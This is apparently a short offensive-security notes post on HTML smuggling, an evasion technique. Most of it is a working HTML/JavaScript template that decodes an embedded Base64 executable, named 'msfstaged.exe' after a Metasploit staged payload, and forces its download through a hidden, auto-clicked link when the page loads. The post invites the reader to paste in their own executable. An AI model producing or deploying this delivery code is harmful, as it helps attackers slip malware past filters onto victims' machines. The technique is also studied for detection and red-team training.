---
description: >-
  HTML Smuggling
title: HTML Smuggling              # Add title here
date: 2025-05-19 08:00:00 -0600                           # Change the date to match completion date
categories: [22 Evasion Techniques, HTML Smuggling]          # Change Templates to Writeup
tags: [evasion, html smuggling]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/icons/Destroyercms.png                # Add infocard image here for post preview image
---

This technique leverages the HTML5 anchor tag download attribute, which instructs the browser to automatically download a file when a user clicks the assigned hyperlink.

```bash
<html>
  <body>
    <script>
      // Convert Base64 string to ArrayBuffer
      function base64ToArrayBuffer(base64) {
        var binary_string = window.atob(base64);
        var len = binary_string.length;
        var bytes = new Uint8Array(len);
        for (var i = 0; i < len; i++) {
          bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes.buffer;
      }

      // Insert your Base64-encoded EXE below (single line, no newlines)
      var file = '<BASE64_STRING>';

      // Convert to ArrayBuffer and create Blob
      var data = base64ToArrayBuffer(file);
      var blob = new Blob([data], { type: 'application/octet-stream' });
      var fileName = 'msfstaged.exe';

      // Create invisible link and trigger download
      var a = document.createElement('a');
      document.body.appendChild(a);
      a.style = 'display: none';
      var url = window.URL.createObjectURL(blob);
      a.href = url;
      a.download = fileName;
      a.click();

      // Revoke URL to clean up
      window.URL.revokeObjectURL(url);
    </script>
  </body>
</html>
```